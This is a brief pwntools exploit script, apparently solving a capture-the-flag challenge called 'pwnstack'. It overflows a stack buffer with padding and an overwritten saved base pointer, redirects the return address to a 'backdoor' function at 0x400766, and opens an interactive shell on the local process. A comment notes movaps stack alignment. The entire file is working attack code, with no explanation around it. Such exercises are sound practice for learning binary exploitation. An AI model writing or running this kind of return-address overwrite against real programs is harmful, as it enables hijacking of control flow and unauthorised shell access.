from pwn import *
context(log_level='debug',os='linux',arch='amd64') # arch='i386'
io=process("./pwnstack")
#io=remote("",)

# 

#gdb.attach(io,"b *0x0400756")
#pause()

backdoor = 0x0400766	#0x0400762 

payload = b'A'*0xa0+b'b'*8+p64(backdoor)
io.send(payload)

io.interactive()


#   movaps  mov浮点数
